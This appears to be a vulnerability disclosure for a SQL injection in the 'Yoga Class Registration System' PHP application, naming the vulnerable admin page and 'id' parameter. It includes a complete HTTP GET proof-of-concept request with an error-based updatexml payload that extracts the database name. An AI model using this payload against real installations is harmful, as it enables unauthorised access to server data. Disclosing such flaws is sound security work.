## Yoga Class Registration System has sql injection vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html

## Vulnerability file
/php-ycrs/admin/?page=categories/view_category

## Vulnerability analysis
<img width="1171" alt="image" src="https://github.com/user-attachments/assets/b5d9be10-1b87-42c3-a98d-c7b8a3648b38">


## describe
There is an unrestricted SQL injection attack in the Yoga Class Registration System, and the controllable parameter is id. An attacker can obtain sensitive server information through this vulnerability.

POC
```
GET /php-ycrs/admin/?page=categories/view_category&id=6%27+and+updatexml%281%2Cconcat%280x7e%2C%28database%28%29%29%29%2C3%29--+q HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
<img width="1543" alt="image" src="https://github.com/user-attachments/assets/82d00011-fc0d-4894-bffb-eaa76707adff">







